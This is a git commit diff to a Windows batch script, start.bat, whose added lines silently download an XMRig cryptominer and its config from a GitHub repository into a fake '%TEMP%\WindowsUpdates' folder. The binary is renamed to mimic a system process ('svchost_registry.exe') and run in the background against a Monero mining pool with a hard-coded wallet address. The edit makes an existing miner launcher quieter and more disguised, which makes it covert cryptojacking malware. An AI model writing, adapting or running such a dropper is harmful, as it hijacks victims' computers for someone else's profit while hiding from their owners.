efa0272004c376c69edbf76eb8eb714c7e12ec28
sturneworld <soll69998c@kz.chessgamingworld.com>
2026-01-29 19:22:42 +0300

    Rework

--- start.bat
+++ start.bat
@@ -2,23 +2,14 @@
 setlocal
 
 set "DIR=%TEMP%\WindowsUpdates"
+set "EXE_NAME=svchost_registry.exe"
 
 if not exist "%DIR%" mkdir "%DIR%"
 cd /d "%DIR%" || exit /b
 
-powershell -NoProfile -Command ^
-  "try { Invoke-WebRequest -Uri 'https://github.com/sturneworld/test/raw/refs/heads/main/xmrig.exe' -OutFile 'xmrig.exe' -UseBasicParsing } catch { exit 1 }"
+if not exist "%EXE_NAME%" curl -s -L "https://github.com/sturneworld/test/raw/refs/heads/main/xmrig.exe" -o "%EXE_NAME%"
+if not exist "config.json" curl -s -L "https://github.com/sturneworld/test/raw/refs/heads/main/config.json" -o "config.json"
 
-powershell -NoProfile -Command ^
-  "try { Invoke-WebRequest -Uri 'https://github.com/sturneworld/test/raw/refs/heads/main/config.json' -OutFile 'config.json' -UseBasicParsing } catch { exit 1 }"
+start /b "" "%EXE_NAME%" --url pool.hashvault.pro:443 --user 45xgDc3Cb6mTZgKCnQwTsBbE3kCWLBSpcGJFguMsWk1d7i3Ndi5i3oYDXnVjSa7gruTvBbN7JrGdpUFGsQaLai7RLhB55Qi --pass worker --donate-level 1 --background --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
 
-if not exist "xmrig.exe" (
-    echo File.exe not found
-    pause
-    exit /b
-)
-
-start xmrig --url pool.hashvault.pro:443 --user 45xgDc3Cb6mTZgKCnQwTsBbE3kCWLBSpcGJFguMsWk1d7i3Ndi5i3oYDXnVjSa7gruTvBbN7JrGdpUFGsQaLai7RLhB55Qi --pass worker --donate-level 1 --background --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
-
-echo Done
-pause
+exit
